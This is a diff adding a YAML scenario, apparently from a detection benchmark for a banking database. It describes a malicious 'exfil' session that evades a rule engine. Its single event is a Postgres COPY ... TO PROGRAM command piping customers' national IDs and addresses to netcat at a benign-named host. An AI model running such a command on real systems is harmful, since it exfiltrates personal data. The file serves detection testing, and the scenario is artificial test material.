@@ -1,0 +1,30 @@
+scenario_id: gen_banking_40_copy_to_program_mal_1024m
+family_id: gen_banking_40_copy_to_program_fam_1024
+domain: banking
+time_of_day: 03:05
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: exfil
+  role: batch_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 8.0
+  events:
+  - step_id: dump
+    sql: COPY (SELECT national_id, address FROM customers) TO PROGRAM 'nc audit-intake.corp
+      443'
+    connects_to:
+      ip: 10.22.34.195
+      port: 9443
+matched_pair_id: gen_banking_40_copy_to_program_pair_1024
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
